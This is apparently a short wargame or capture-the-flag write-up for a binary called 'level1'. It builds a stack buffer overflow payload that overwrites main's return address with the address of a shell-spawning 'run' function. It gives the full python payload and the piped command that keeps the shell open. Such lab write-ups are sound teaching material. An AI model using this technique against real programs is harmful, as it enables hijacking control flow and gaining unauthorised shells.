## Payload construction 

In the static analysis we found that the `run` function executes a shell.

We can overwrite the `return address of main` by the address of the `run` function. 
```
info functions
...
0x08048444  run

payload: (python -c 'print "A" * 76 + "\x44\x84\x04\x08"')
```

We redirect the stream to the program with a pipe and we add the command `cat` to keep the shell alive.
```
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
```


